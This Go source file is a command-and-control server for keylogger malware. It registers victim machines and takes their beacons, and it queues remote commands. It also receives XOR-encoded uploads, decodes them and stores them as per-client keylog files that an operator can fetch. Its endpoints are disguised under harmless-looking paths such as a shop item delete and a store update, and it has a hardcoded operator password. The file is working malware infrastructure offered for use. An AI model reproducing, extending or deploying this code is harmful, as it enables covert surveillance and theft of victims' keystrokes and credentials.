package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

type Client struct {
	ID       string
	LastSeen time.Time
	Command  string
	Duration int
	Key      byte
}

type ClientView struct {
	ID       string
	LastSeen string
}

var (
	clients     map[string]*Client
	clientsLock sync.Mutex
)

func init() {
	clients = make(map[string]*Client)
}

func decode(cipherText []byte, key byte) string {
	plainText := make([]byte, len(cipherText))

	for i := 0; i < len(cipherText); i++ {
		c := cipherText[i]
		plainText[i] = c ^ key
	}

	decodeedStr := ""
	for _, b := range plainText {
		decodeedStr += string(rune(b))
	}

	return decodeedStr
}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	key := r.URL.Query().Get("c")
	if key == "" {
		http.Error(w, "Client key not provided", http.StatusBadRequest)
		return
	}

	if key == "" {
		http.Error(w, "Key not provided", http.StatusBadRequest)
		return
	}

	parsedInt, _ := strconv.ParseUint(key, 16, 8)
	byteVal := byte(parsedInt)
	encyptionKey := byteVal

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if _, exists := clients[clientID]; exists {
		http.Error(w, "Client already registered", http.StatusBadRequest)
		return
	}

	clients[clientID] = &Client{ID: clientID, LastSeen: time.Now(), Key: encyptionKey}
	fmt.Printf("Client registered: %s\n", clientID)
	fmt.Fprintf(w, "Client registered: %s", clientID)
}

func unregisterHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if _, exists := clients[clientID]; !exists {
		http.Error(w, "Client not found", http.StatusBadRequest)
		return
	}

	delete(clients, clientID)
	fmt.Printf("Client unregistered: %s\n", clientID)
	fmt.Fprintf(w, "Client unregistered: %s", clientID)
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	beaconTime := r.URL.Query().Get("t")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if client, exists := clients[clientID]; exists {
		client.LastSeen = time.Now()
		fmt.Printf("Beacon received from client %s at %s\n", clientID, beaconTime)
		fmt.Fprintf(w, "Beacon received from client %s", clientID)
	} else {
		http.Error(w, "Client not found", http.StatusNotFound)
	}
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	command := r.URL.Query().Get("cmd")
	password := r.URL.Query().Get("password")

	if clientID == "" || command == "" {
		http.Error(w, "Client ID or Command not provided", http.StatusBadRequest)
		return
	}

	if password == "" || password != "password" {
		http.Error(w, "Wrong passowrd provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	if command == "slp" {
		duration := r.URL.Query().Get("duration")
		if duration == "" {
			http.Error(w, "Duration not provided for sleep command", http.StatusBadRequest)
			return
		}
		client.Command = fmt.Sprintf("slp %s", duration)
		fmt.Printf("Client %s instructed to sleep for %s seconds\n", clientID, duration)
	} else {
		client.Command = command
	}

	fmt.Printf("Command '%s' sent to client %s\n", command, clientID)
	fmt.Fprintf(w, "Command '%s' sent to client %s", command, clientID)
}

func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("d")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, client.Command)

	client.Command = ""
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	type ViewData struct {
		Clients []ClientView
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	var clientViews []ClientView
	for _, client := range clients {
		clientViews = append(clientViews, ClientView{
			ID:       client.ID,
			LastSeen: client.LastSeen.Format(time.RFC3339),
		})
	}

	data := ViewData{
		Clients: clientViews,
	}

	templ := template.Must(template.ParseFiles("server.html"))
	templ.Execute(w, data)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// Get clientID from query parameter or form data
	clientID := r.FormValue("id")
	if clientID == "" {
		http.Error(w, "Missing clientID", http.StatusBadRequest)
		return
	}

	client := clients[clientID]

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Unable to retrieve file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	var buf bytes.Buffer
	_, err = io.Copy(&buf, file)
	if err != nil {
		log.Printf("Failed to read file: %v", err)
		http.Error(w, "Failed to read file", http.StatusInternalServerError)
		return
	}

	decodeedContent := decode(buf.Bytes(), client.Key)

	fileName := fmt.Sprintf("%s_%s.log", handler.Filename, clientID)
	f, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666)
	if err != nil {
		log.Printf("Failed to create file: %v", err)
		http.Error(w, "Failed to create file", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	_, err = f.Write([]byte(decodeedContent))
	if err != nil {
		log.Printf("Failed to save file: %v", err)
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	log.Printf("File uploaded successfully: %s", fileName)
	fmt.Fprintf(w, "File uploaded successfully\n")
}

func getKeylogsHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("keylogFilePath")
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	keylogFilePath := fmt.Sprintf("error.log_%s.log", clientID)
	fmt.Println(keylogFilePath)
	data, err := os.ReadFile(keylogFilePath)
	if err != nil {
		http.Error(w, "Failed to read keylog file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write(data)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/register", registerHandler)          
	mux.HandleFunc("/api/v1/shop/delete-item", unregisterHandler) 
	mux.HandleFunc("/api/v1/status", beaconHandler)               
	mux.HandleFunc("/command", commandHandler)
	mux.HandleFunc("/api/v2/update", getCommandHandler) 
	mux.HandleFunc("/getKeylogs", getKeylogsHandler)
	mux.HandleFunc("/store/update", uploadHandler)
	mux.HandleFunc("/clients", homeHandler)

	certFile := "server.crt"
	keyFile := "server.key"
	caCertPath := "ca.crt"

	caCert, err := os.ReadFile(caCertPath)
	if err != nil {
		log.Println(err)
		return
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	cfg := &tls.Config{
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  caCertPool,
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS12,
	}
	srv := &http.Server{
		Addr:      ":8443",
		Handler:   mux,
		TLSConfig: cfg,
	}

	fmt.Println("C&C server listening on :8443...")
	log.Fatal(srv.ListenAndServeTLS(certFile, keyFile))
}
